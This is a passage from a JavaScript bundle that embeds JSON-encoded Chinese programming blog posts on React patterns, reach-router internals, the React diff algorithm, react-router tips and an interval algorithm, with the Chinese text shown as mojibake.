prevE=curE\\n    count++\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> count\\n}\\n</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-08","timeArr":[2018,10,8,0,0,0,0],"title":"æ±‚ä¸é‡å é—´éš”çš„ç®—æ³•","uuid":"bebc0fc1532d19e9cec7bedd22a5141f7927276c","summary":"<p>ç»™å‡ºä¸€ç³»åˆ—é—´éš”ï¼Œä¾‹å¦‚<code>[[1,2],[3,5],[1,3],[2,3],[2,4]]</code></p>\\n<p>æ±‚å‡ºæœ€å¤§çš„ä¸é‡å¤é—´éš”æ•°é‡ã€‚</p>\\n<p>ä¾‹1:</p>\\n<p>input : <code>[[1,2],[3,5],[1,3],[2,3],[2,4]]</code></p>\\n<p>output : 3</p>\\n<p>è¿™ç§é¢˜æ€è·¯æ˜¯æŒ‰é—´éš”çš„<code>å°¾éƒ¨æ’åº</code>ã€‚</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n * Definiti...</span></code></pre>","slug":"qiu-bu-chong-die-jian-ge-de-suan-fa","sha":"88bd0b8b65d66224f77f7c40a5034f06a5ca729a"}')},625:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"reachrouter\\">reach/router</h2>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.reach-router/README.md\\">å®Œæ•´æºç è¯´æ˜æ³¨é‡Š</a></p>\\n<p>ä¸€å¼ å¯¼å›¾ï¼š</p>\\n<p><img src=\\"/article/img/reachRouter.png\\" alt=\\"\\"></p>\\n<p>å‡ ä¸ªäº®ç‚¹ï¼š</p>\\n<ul>\\n<li>åŒ¹é…é¡ºåº</li>\\n</ul>\\n<p>æºç ä¸­æ˜¯ä½¿ç”¨äº†ä¸€ä¸ªè¯„åˆ†çš„æ–¹æ³•ï¼š</p>\\n<ol>\\n<li>å…ˆå¯¹è·¯å¾„å»é™¤å¤´å°¾çš„<code>/</code> ï¼Œå¹¶ä¸”æŒ‰<code>/</code>åˆ†å‰²æˆè·¯å¾„ç‰‡æ®µæ•°ç»„</li>\\n<li>å¯¹æ•°ç»„ä½¿ç”¨reduceæ–¹æ³•è®¡ç®—åˆ†å€¼ï¼Œå¦‚ä¸‹ï¼š<pre><code><pre class=\\"hljs\\"><code>let SEGMENT_POINTS = 4;     // åŸºæœ¬åˆ†å€¼ï¼Œæ¯ä¸€ä¸ªè·¯å¾„ç‰‡æ®µéƒ½æœ‰\\nlet STATIC_POINTS = 3;      // é™æ€è·¯å¾„ï¼Œå¦‚ï¼š/abc\\nlet DYNAMIC_POINTS = 2;     // åŠ¨æ€è·¯å¾„ï¼Œå¦‚ï¼š/:section\\nlet SPLAT_PENALTY = 1;      // é€šé…ç¬¦ï¼ˆå‡åˆ†ï¼‰ï¼Œå¦‚ï¼š/*ï¼Œæ­¤å¤„é‡åˆ°é€šé…ç¬¦ä¼šå…ˆå‡å»åŸºæœ¬åˆ†å€¼ï¼Œå†å‡1åˆ†ï¼ˆä¼˜å…ˆæƒå¾ˆä½ï¼‰\\nlet ROOT_POINTS = 1;        // æ ¹è·¯å¾„</code></pre></code></pre>å¯çŸ¥ä¼˜å…ˆæƒæ’åºä¸ºï¼š</li>\\n</ol>\\n<p>é™æ€è·¯å¾„ &gt; åŠ¨æ€è·¯å¾„ &gt; æ ¹è·¯å¾„ &gt; é€šé…ç¬¦</p>\\n<ul>\\n<li>ç›¸å¯¹è·¯å¾„</li>\\n</ul>\\n<p>æ¶‰åŠåˆ°3ä¸ªæ–¹æ³•ï¼š</p>\\n<p><code>./index.js--&gt;createRoute</code></p>\\n<p><code>./lib/utils.js--&gt;resolve</code></p>\\n<p><code>./lib/util.js--&gt;pick</code></p>\\n<p>é¦–å…ˆæ˜¯é€šè¿‡<code>basepath</code>(ä¸€ä¸ªRouterè‡ªå®šä¹‰å±æ€§ï¼Œç”¨ä½œè·¯å¾„çš„å…¬å…±å‰ç¼€)ç»“åˆæ¯ä¸€ä¸ªchildren(å³Route Component)çš„pathé€šè¿‡<code>createRoute</code>æ–¹æ³•è®¡ç®—å‡ºä¸€ä¸ªç»å¯¹è·¯å¾„</p>\\n<p>å†é€šè¿‡<code>pick</code>æ–¹æ³•ä¸å½“å‰<code>pathname</code>(å³window.location.pathname)è¿›è¡ŒåŒ¹é…ï¼Œè®¡ç®—å¾—å‡ºä¸€ä¸ªéé€šé…(<em>)è·¯å¾„åŒ¹é…å€¼(baseuri)ï¼Œ`ä¾‹å¦‚ï¼š&#39;a/</em>&#39; --&gt;åŒ¹é…å‡º basuri:&#39;/a&#39;`</p>\\n<p>è¿™ä¸ªbaseuriä¼šä½œä¸º<code>BaseContext</code>(React.createContext)çš„contextä¼ é€’ç»™å†…éƒ¨ç»„ä»¶ï¼Œæœ€åä½¿ç”¨<code>resolve</code>æ–¹æ³•å¯¹Linkä¸Šçš„toçš„è·¯å¾„(å¯èƒ½æ˜¯ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯èƒ½æ˜¯ç›¸å¯¹è·¯å¾„)æ­é…<code>baseuri</code>è¿›è¡Œè§£æ(è½¬æ¢æˆç»å¯¹è·¯å¾„)ï¼Œå¹¶ä¸”è·³è½¬</p>\\n<ul>\\n<li>è‡ªåŠ¨focus</li>\\n</ul>\\n<p>å¯¹å±å¹•é˜…è¯»å™¨ç‰¹åˆ«å‹å¥½ï¼Œæ¯æ¬¡é€šè¿‡Linkè·³è½¬åï¼Œä¼šè‡ªåŠ¨focusåˆ°å½“å‰è·³è½¬å¯¹åº”çš„Componentï¼Œä¹Ÿå°±æ˜¯ä¸éœ€è¦å†é€šè¿‡å¤§é‡çš„tabæŒ‰é’®å»å¯»æ‰¾å†…å®¹é¡µé¢</p>\\n","toc":[{"anchor":"reachrouter","level":2,"text":"reach/router"}],"relatedTags":null,"created_at":"2018-07-08","timeArr":[2018,6,8,0,0,0,0],"title":"reach-router","uuid":"1478ca77fae5cf65527c2cf310fae0e530ea7496","summary":"<h4>reach/router</h4>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.reach-router/README.md\\">å®Œæ•´æºç è¯´æ˜æ³¨é‡Š</a></p>\\n<p>ä¸€å¼ å¯¼å›¾ï¼š</p>\\n<p>![](/article/img/reachRoute...</p>","slug":"reach-router","sha":"a479afc7ac0daaf4863905d74229db3658f16354"}')},626:function(n){n.exports=JSON.parse('{"content":"<p>ä½¿ç”¨4ç§æ–¹å¼ï¼špropsä¼ é€’ï¼Œçˆ¶ç»„ä»¶å…¬ç”¨ï¼Œhocï¼Œrender-prop</p>\\n<p>å®šä¹‰éœ€æ±‚ï¼Œcurç¬¦åˆauthæ‰èƒ½æŸ¥çœ‹ç»„ä»¶å†…å®¹ï¼Œå¦åˆ™è¿›å…¥NotAccess</p>\\n<pre><code><pre class=\\"hljs\\"><code>const cur = &quot;a&quot;;\\nconst auth = {\\n  com1: [&quot;a&quot;, &quot;b&quot;],\\n  com2: [&quot;b&quot;, &quot;c&quot;],\\n  com3: [&quot;c&quot;, &quot;d&quot;]\\n};\\nconst NotAccess = () =&gt; &lt;div&gt;Not Access&lt;/div&gt;;</code></pre></code></pre><h2 id=\\"props-chuan-di\\">propsä¼ é€’</h2>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Component1 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">const</span> { comId } = props;\\n  <span class=\\"hljs-keyword\\">const</span> isValid = auth[comId].includes(cur);\\n  <span class=\\"hljs-keyword\\">return</span> isValid ? &lt;div&gt;Component1&lt;/div&gt; : &lt;NotAccess /&gt;;\\n};\\n<span class=\\"hljs-keyword\\">const</span> Component2 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">const</span> { comId } = props;\\n  <span class=\\"hljs-keyword\\">const</span> isValid = auth[comId].includes(cur);\\n  <span class=\\"hljs-keyword\\">return</span> isValid ? &lt;div&gt;Component2&lt;/div&gt; : &lt;NotAccess /&gt;;\\n};\\n<span class=\\"hljs-keyword\\">const</span> Component3 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">const</span> { comId } = props;\\n  <span class=\\"hljs-keyword\\">const</span> isValid = auth[comId].includes(cur);\\n  <span class=\\"hljs-keyword\\">return</span> isValid ? &lt;div&gt;Component3&lt;/div&gt; : &lt;NotAccess /&gt;;\\n};\\n\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;div&gt;\\n        &lt;Component1 comId={\\"com1\\"} /&gt;\\n        &lt;Component2 comId={\\"com2\\"} /&gt;\\n        &lt;Component3 comId={\\"com3\\"} /&gt;\\n      &lt;/div&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n<p><a href=\\"https://codesandbox.io/s/04nxrzzm1v\\">åœ¨çº¿ä¾‹å­</a></p>\\n<h2 id=\\"zu-jian-fu-yong-children\\">ç»„ä»¶å¤ç”¨+Children</h2>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Component1 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component1&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component2 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component2&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component3 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component3&lt;/div&gt;;\\n\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">AuthComponent</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  render() {\\n    <span class=\\"hljs-keyword\\">const</span> { comId } = <span class=\\"hljs-keyword\\">this</span>.props;\\n    <span class=\\"hljs-keyword\\">const</span> isValid = auth[comId].includes(cur);\\n    <span class=\\"hljs-keyword\\">return</span> isValid ? <span class=\\"hljs-keyword\\">this</span>.props.children : &lt;NotAccess /&gt;;\\n  }\\n}\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;div&gt;\\n        &lt;AuthComponent comId={\\"com1\\"}&gt;\\n          &lt;Component1 /&gt;\\n        &lt;/AuthComponent&gt;\\n        &lt;AuthComponent comId={\\"com2\\"}&gt;\\n          &lt;Component2 /&gt;\\n        &lt;/AuthComponent&gt;\\n        &lt;AuthComponent comId={\\"com3\\"}&gt;\\n          &lt;Component3 /&gt;\\n        &lt;/AuthComponent&gt;\\n      &lt;/div&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n<p><a href=\\"https://codesandbox.io/s/zvo23629m\\">åœ¨çº¿ä¾‹å­</a></p>\\n<h2 id=\\"gao-jie-zu-jian--hoc\\">é«˜é˜¶ç»„ä»¶ HOC</h2>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Component1 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component1&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component2 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component2&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component3 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component3&lt;/div&gt;;\\n\\n<span class=\\"hljs-keyword\\">const</span> Auth = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">Component, comId</span>) =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n    render() {\\n      <span class=\\"hljs-keyword\\">const</span> isValid = auth[comId].includes(cur);\\n      <span class=\\"hljs-keyword\\">return</span> isValid ? &lt;Component /&gt; : &lt;NotAccess /&gt;;\\n    }\\n  };\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> AuthCom1 = Auth(Component1, <span class=\\"hljs-string\\">\\"com1\\"</span>);\\n<span class=\\"hljs-keyword\\">let</span> AuthCom2 = Auth(Component2, <span class=\\"hljs-string\\">\\"com2\\"</span>);\\n<span class=\\"hljs-keyword\\">let</span> AuthCom3 = Auth(Component3, <span class=\\"hljs-string\\">\\"com3\\"</span>);\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;div&gt;\\n        &lt;AuthCom1 /&gt;\\n        &lt;AuthCom2 /&gt;\\n        &lt;AuthCom3 /&gt;\\n      &lt;/div&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n<p><a href=\\"https://codesandbox.io/s/9oz40znmvy\\">åœ¨çº¿ä¾‹å­</a></p>\\n<h2 id=\\"render-prop\\">render-prop</h2>\\n<p>Appç»„ä»¶å¯ä»¥è½»æ¾çš„è·å–ä»»ä½•å­ç»„ä»¶é‡Œçš„å‚æ•°</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Component1 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component1&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component2 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component2&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component3 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component3&lt;/div&gt;;\\n\\n<span class=\\"hljs-keyword\\">const</span> AuthCom = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">const</span> validEles = React.Children.map(props.children, e =&gt; {\\n    <span class=\\"hljs-keyword\\">const</span> { comId } = e.props;\\n    <span class=\\"hljs-keyword\\">return</span> auth[comId].includes(cur) ? e : &lt;NotAccess /&gt;;\\n  });\\n  <span class=\\"hljs-keyword\\">return</span> props.render(validEles);\\n};\\n\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;AuthCom\\n        render={validEles =&gt; {\\n          return validEles.map(e =&gt; e);\\n        }}\\n      &gt;\\n        &lt;Component1 comId=\\"com1\\" /&gt;\\n        &lt;Component2 comId=\\"com2\\" /&gt;\\n        &lt;Component3 comId=\\"com3\\" /&gt;\\n      &lt;/AuthCom&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n<p><a href=\\"https://codesandbox.io/s/l27ljm781q\\">åœ¨çº¿ä¾‹å­</a></p>\\n","toc":[{"anchor":"props-chuan-di","level":2,"text":"propsä¼ é€’"},{"anchor":"zu-jian-fu-yong-children","level":2,"text":"ç»„ä»¶å¤ç”¨+Children"},{"anchor":"gao-jie-zu-jian--hoc","level":2,"text":"é«˜é˜¶ç»„ä»¶ HOC"},{"anchor":"render-prop","level":2,"text":"render-prop"}],"relatedTags":null,"created_at":"2018-08-04","timeArr":[2018,7,4,0,0,0,0],"title":"reactçš„ç¼–å†™æ¨¡å¼","uuid":"6fd675137d4fc7c9017a5d49e6617b15a17ace30","summary":"<p>ä½¿ç”¨4ç§æ–¹å¼ï¼špropsä¼ é€’ï¼Œçˆ¶ç»„ä»¶å…¬ç”¨ï¼Œhocï¼Œrender-prop</p>\\n<p>å®šä¹‰éœ€æ±‚ï¼Œcurç¬¦åˆauthæ‰èƒ½æŸ¥çœ‹ç»„ä»¶å†…å®¹ï¼Œå¦åˆ™è¿›å…¥NotAccess</p>\\n<pre class=\\"hljs\\"><code>const cur = &quot;a&quot;;\\nconst auth = {\\n  com1: [&quot;a&quot;, &quot;b&quot;],\\n  com2: [&quot;b&quot;, &quot;c&quot;],\\n  com3: [...</code></pre>","slug":"react-de-bian-xie-mo-shi","sha":"ac63fa5d204d619196b3d6c6134d623fb670d2f1"}')},627:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"diff-suan-fa-3-ge-ce-lve\\">Diffç®—æ³•3ä¸ªç­–ç•¥</h4>\\n<ol>\\n<li>è·¨å±‚çº§ä¸è¿›è¡Œä¸æ¯”è¾ƒ</li>\\n<li>ä¸åŒç±»ä¸è¿›è¡Œæ¯”è¾ƒ</li>\\n<li>åŒç±»åŒçº§é€šè¿‡keyæ¯”è¾ƒ</li>\\n</ol>\\n<p>ä¸»è¦å¯¹ç¬¬ä¸‰ç§è¿›è¡Œè§£é‡Š</p>\\n<h2 id=\\"li-zi\\">ä¾‹å­</h2>\\n<p>æ›´æ–°å‰ç»„ä»¶ï¼š<code>A-B-C-D</code> =&gt; æ›´æ–°åç»„ä»¶ï¼š<code>C-B-E-A</code></p>\\n<p>æ»¡è¶³<code>child._mountIndex &lt; lastIndex</code>æ‰ä¼šè¿›è¡Œç»„ä»¶ç§»åŠ¨</p>\\n<ul>\\n<li><p><code>child._mountIndex</code>å…¶å®æ˜¯å½“å‰çš„indexï¼Œä½†æ­¤æ—¶æ­£åœ¨æ¯”è¾ƒï¼Œè¿˜æœªå˜åŠ¨ï¼Œä¹Ÿå°±æ˜¯æ›´æ–°å‰çš„index</p>\\n</li>\\n<li><p><code>lastIndex</code>æ˜¯ä¸€ä¸ªä¸æ–­æ›´æ–°çš„å€¼ï¼Œæ¯ä¸€ä¸ªç»„ä»¶æ¯”è¾ƒåï¼ŒlastIndexä¸º<code>Math.max(prevChild.mountIndex,lastIndex)</code></p>\\n</li>\\n</ul>\\n<p>éå†æ–°é›†åˆï¼š</p>\\n<p>æ¯”è¾ƒCï¼š<code>child._mountIndex</code>ä¸º2ï¼Œ<code>lastIndex</code>ä¸º0,ä¸æ»¡è¶³ï¼Œä¸æ‰§è¡Œå˜åŠ¨ï¼Œæ›´æ–°<code>lastIndex</code>ä¸º2ï¼›</p>\\n<p>æ¯”è¾ƒBï¼š<code>child._mountIndex</code>ä¸º1ï¼Œ<code>lastIndex</code>ä¸º2ï¼Œæ»¡è¶³ï¼Œæ‰§è¡Œç§»åŠ¨ï¼Œæ›´æ–°<code>lastIndex</code>ä¸º2ï¼›</p>\\n<p>æ¯”è¾ƒEï¼šæ—§é›†åˆæœªæ‰¾åˆ°ï¼Œæ‰§è¡Œæ·»åŠ ï¼Œ<code>lastIndex</code>ä¸º2ï¼›</p>\\n<p>æ¯”è¾ƒAï¼š<code>child._mountIndex</code>ä¸º0ï¼Œ<code>lastIndex</code>ä¸º2ï¼Œæ»¡è¶³ï¼Œæ‰§è¡Œç§»åŠ¨ï¼Œæ›´æ–°<code>lastIndex</code>ä¸º2ï¼›</p>\\n<p>éå†æ—§é›†åˆï¼Œå‘ç°Dï¼Œæ‰§è¡Œåˆ é™¤</p>\\n<h2 id=\\"que-dian\\">ç¼ºç‚¹</h2>\\n<p>ä»ä¸Šé¢ä¾‹å­å¯ä»¥å‘ç°ï¼Œdiffç®—æ³•ä¸»è¦é€šè¿‡ä¸æ–­æ›´æ–°<code>lastIndex</code>è¿›è¡Œåˆ¤æ–­ï¼Œå› æ­¤ï¼Œ\\nå¦‚æœ<code>lastIndex</code>ä¸€å¼€å§‹å°±æ›´æ–°æˆæœ€åä¸€ä¸ªindexï¼Œé‚£ä¹ˆåé¢çš„æ‰€æœ‰ç»„ä»¶éƒ½è¦è¿›è¡Œå˜åŠ¨ã€‚</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<p>æ›´æ–°å‰ç»„ä»¶ï¼š<code>A-B-C-D</code> =&gt; æ›´æ–°åç»„ä»¶ï¼š<code>D-A-B-C</code></p>\\n<p>ä¸€å¼€å§‹æ¯”è¾ƒDï¼š<code>child._mountIndex</code>ä¸º3ï¼Œ<code>lastIndex</code>ä¸º0,ä¸æ»¡è¶³ï¼Œä¸æ‰§è¡Œå˜åŠ¨ï¼Œæ›´æ–°<code>lastIndex</code>ä¸º3ï¼›</p>\\n<p>æ­¤æ—¶<code>lastIndex</code>å·²ç»ä¸ºæœ€å¤§å€¼ï¼Œåé¢æ‰€æœ‰æ¯”è¾ƒéƒ½ä¼šæ»¡è¶³<code>child._mountIndex &lt; lastIndex</code></p>\\n<p>æ›´æ–°å˜åŠ¨ä¸ºï¼š</p>\\n<p>Dç»„ä»¶ä¸å˜</p>\\n<p>A,B,Cç»„ä»¶éƒ½è¦ç§»åŠ¨</p>\\n","toc":[{"anchor":"diff-suan-fa-3-ge-ce-lve","level":4,"text":"Diffç®—æ³•3ä¸ªç­–ç•¥"},{"anchor":"li-zi","level":2,"text":"ä¾‹å­"},{"anchor":"que-dian","level":2,"text":"ç¼ºç‚¹"}],"relatedTags":null,"created_at":"2018-06-21","timeArr":[2018,5,21,0,0,0,0],"title":"react-diff","uuid":"a7eefe5d3d4ed07619a790048edf4b9617f40957","summary":"<h4>Diffç®—æ³•3ä¸ªç­–ç•¥</h4>\\n<ol>\\n<li>è·¨å±‚çº§ä¸è¿›è¡Œä¸æ¯”è¾ƒ</li>\\n<li>ä¸åŒç±»ä¸è¿›è¡Œæ¯”è¾ƒ</li>\\n<li>åŒç±»åŒçº§é€šè¿‡keyæ¯”è¾ƒ</li>\\n</ol>\\n<p>ä¸»è¦å¯¹ç¬¬ä¸‰ç§è¿›è¡Œè§£é‡Š</p>\\n<h4>ä¾‹å­</h4>\\n<p>æ›´æ–°å‰ç»„ä»¶ï¼š<code>A-B-C-D</code> =&gt; æ›´æ–°åç»„ä»¶ï¼š<code>C-B-E-A</code></p>\\n<p>æ»¡è¶³<code>child._mountIndex &lt; lastIndex</code>æ‰ä¼šè¿›è¡Œç»„ä»¶ç§»åŠ¨</p>\\n<ul>\\n<li>`...</li>\\n</ul>","slug":"react-diff","sha":"815f451f91044acdeba648889b432803b50a1130"}')},628:function(n){n.exports=JSON.parse('{"content":"<ol>\\n<li><code>SPA</code>çš„routerè·³è½¬åç«‹åˆ»å›åˆ°æœ€é¡¶ç«¯</li>\\n</ol>\\n<p>æ ¸å¿ƒï¼šæ·»åŠ <code>window.scrollTo(0, 0)</code></p>\\n<p>å¯ä»¥åœ¨æ¯ä¸€ä¸ª<code>Component</code>é‡Œé¢å†™ï¼Œä¹Ÿå¯ä»¥åŒ…è£¹<code>Route</code></p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">ScrollToTopRoute</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  componentDidUpdate(prevProps) {\\n    <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-keyword\\">this</span>.props.location.pathname !== prevProps.location.pathname){\\n      <span class=\\"hljs-built_in\\">window</span>.scrollTo(<span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">0</span>);\\n    }\\n  }\\n  render() {\\n    <span class=\\"hljs-keyword\\">const</span> { <span class=\\"hljs-attr\\">component</span>: Component, ...rest } = <span class=\\"hljs-keyword\\">this</span>.props;\\n    <span class=\\"hljs-keyword\\">return</span> &lt;Route {...rest} render={props =&gt; (&lt;Component {...props} /&gt;)} /&gt;;\\n  }\\n}</code></pre></code></pre>\\n<ol start=\\"2\\">\\n<li>å½“urlçš„searchå‘ç”Ÿå˜åŒ–ï¼Œrouterä¸æœªå‘ç”Ÿæ›´æ–°ï¼Œå› ä¸ºé¡µé¢å¹¶æœªæ”¹å˜</li>\\n</ol>\\n<p>ä¾‹å¦‚ï¼š<code>http://xx.xx.com/search/</code>===&gt;<code>http://xx.xx.com/search/?id=5</code></p>\\n<p>æ ¸å¿ƒï¼šé€šè¿‡ç»™<code>Component</code>è®¾ç½®<code>key</code>ï¼Œå½“keyä¸åŒæ—¶ï¼Œè®©Componentå¼ºåˆ¶æ›´æ–°</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">ScrollToTopRoute</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  componentDidUpdate(prevProps) {\\n    <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-keyword\\">this</span>.props.location.pathname !== prevProps.location.pathname){\\n      <span class=\\"hljs-built_in\\">window</span>.scrollTo(<span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">0</span>);\\n    }\\n  }\\n  render() {\\n    <span class=\\"hljs-keyword\\">const</span> { <span class=\\"hljs-attr\\">component</span>: Component, RouteKey, location, ...rest } = <span class=\\"hljs-keyword\\">this</span>.props;\\n    <span class=\\"hljs-keyword\\">const</span> Key = RouteKey ? location.pathname + location.search : <span class=\\"hljs-literal\\">null</span>;\\n    <span class=\\"hljs-keyword\\">return</span> &lt;Route {...rest} render={props =&gt; (&lt;Component {...props} key={Key} /&gt;)} /&gt;;\\n  }\\n}\\n\\n<span class=\\"hljs-comment\\">// Usage</span>\\n&lt;Router history={History}&gt;\\n  &lt;Switch&gt;\\n    &lt;ScrollToTopRoute exact path=\\"/\\" component={Home}/&gt;\\n    &lt;ScrollToTopRoute exact path=\\"/search\\" component={Search} RouteKey={true} /&gt;\\n  &lt;/Switch&gt;\\n&lt;<span class=\\"hljs-regexp\\">/Router&gt;</span></code></pre></code></pre>\\n<p>å‚è€ƒï¼š<a href=\\"https://blog.bitsrc.io/the-love-hate-relationship-between-react-router-and-react-components-dee4aac5956c\\">The Love-Hate Relationship between React Router and React Components</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-06","timeArr":[2018,10,6,0,0,0,0],"title":"react-router2ä¸ªæŠ€å·§","uuid":"8f280c8e1286471ef7f34acf52ea54212de93568","summary":"<ol>\\n<li><code>SPA</code>çš„routerè·³è½¬åç«‹åˆ»å›åˆ°æœ€é¡¶ç«¯</li>\\n</ol>\\n<p>æ ¸å¿ƒï¼šæ·»åŠ <code>window.scrollTo(0, 0)</code></p>\\n<p>å¯ä»¥åœ¨æ¯ä¸€ä¸ª<code>Component</code>é‡Œé¢å†™ï¼Œä¹Ÿå¯ä»¥åŒ…è£¹<code>Route</code></p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">ScrollToTopRoute</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  componen...</code></pre>","slug":"react-router2-ge-ji-qiao","sha":"557c27da0f9f9270e3a273c2f21a0885dca67e10"}')},629:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"reacttransitiongroup\\">ReactTransitionGroup</h4>\\n<h4 id=\\"transition\\">Transition</h4>\\n<p>é»˜è®¤å±•ç¤ºç»„ä»¶æŸä¸ªç‰¹å®šçŠ¶æ€çš„æ ·å¼ï¼Œè€Œä¸æ˜¯åˆ›å»ºæ¸å˜åŠ¨ç”»</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>&lt;Transition\\n        <span class=\\"hljs-keyword\\">in</span>={toggleShow}\\n        timeout={<span class=\\"hljs-number\\">1000</span>}\\n        unmountOnExit\\n        &gt;\\n    {state=&gt;(\\n        &lt;div&gt;{state}&lt;/div&gt;\\n    )}\\n&lt;<span class=\\"hljs-regexp\\">/Transition&gt;</span></code></pre></code></pre>\\n<p>æ³¨æ„ï¼šå­ç»„ä»¶æ˜¯å‡½æ•°ï¼ˆè§ä¸‹æ–¹childrenï¼‰</p>\\n<h2 id=\\"csstransition\\">CSSTransition</h2>\\n<p>å±•ç¤ºç»„ä»¶ä»çŠ¶æ€åˆ°å¦ä¸€ä¸ªçŠ¶æ€çš„åŠ¨æ€å˜åŒ–ï¼Œéœ€è¦å®šä¹‰classNameå’Œç›¸å…³æ ·å¼</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>&lt;CSSTransition \\n        <span class=\\"hljs-keyword\\">in</span>={toggleShow}\\n        className=<span class=\\"hljs-string\\">\\"fade\\"</span>\\n        timeout={<span class=\\"hljs-number\\">300</span>}\\n        &gt;\\n    <span 